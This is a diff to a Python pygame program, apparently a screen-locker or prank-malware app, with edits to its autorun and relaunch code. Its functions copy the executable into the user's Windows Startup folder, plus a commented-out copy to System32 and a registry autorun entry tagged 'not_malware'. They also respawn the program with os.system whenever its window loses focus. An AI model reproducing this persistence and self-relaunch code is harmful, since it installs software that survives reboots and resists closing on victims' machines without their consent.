@@ -1,5 +1,7 @@
 import hashlib
 import sys
+from shutil import SameFileError
+
 import pygame
 import os
 import getpass
@@ -66,14 +68,13 @@ def create_autorun():
     username = getpass.getuser()
     filename = 'main.exe'
     dir_name = f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/'
+    # dir2_name = 'C:/Windows/System32/'
     try:
         shutil.copy(filename, dir_name)
-    except:
-        try:
-            filename = 'dist/' + filename
-            shutil.copy(filename, dir_name)
-        except:
-            pass
+        # shutil.copy(filename, dir2_name)
+    except (FileNotFoundError, SameFileError) as e:
+        print(e)
+        return
 
 
 def create_autorun_reg(name):
@@ -83,7 +84,7 @@ def create_autorun_reg(name):
 
 
 def main():
-    app_name = sys.argv[0][sys.argv[0].rfind('/')+1:]
+    app_name = sys.argv[0][sys.argv[0].rfind('\\') + 1:]
     create_autorun()
     # create_autorun_reg(app_name[:app_name.find('.')] + 'not_malware')
     pygame.init()
@@ -106,13 +107,22 @@ def main():
     end = False
     while not end:
         if not pygame.display.get_active() and not flag:
-            print(os.system('.\main.exe'))
+            # print(os.system('.main.exe'))
+            # print(os.system('cd "C:\\Users\\timat\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"; .\\main.exe'))
+            # print(os.system('dir "C:\\Users\\timat\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"'))
+            # print(os.system('dir'))
+            # print(os.system('.\main.exe'))
+            print(os.system(f'.\{app_name}'))
+            #  C:\Users\timat\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+            # print(os.system('.C:\\Windows\\System32\\main.exe'))
+            # print(os.system('.C:\\Users\\timat\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\main.exe'))
+            # print(os.system(f'.C:\\Users\\{getpass.getuser()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\main.exe'))
             flag = True
 
         for event in pygame.event.get():
             if event.type == pygame.QUIT:
-                pass
-                # end = True
+                # pass
+                end = True
             if event.type == pygame.KEYDOWN:
                 if event.key == pygame.K_BACKSPACE:
                     input_text = input_text[:-1]
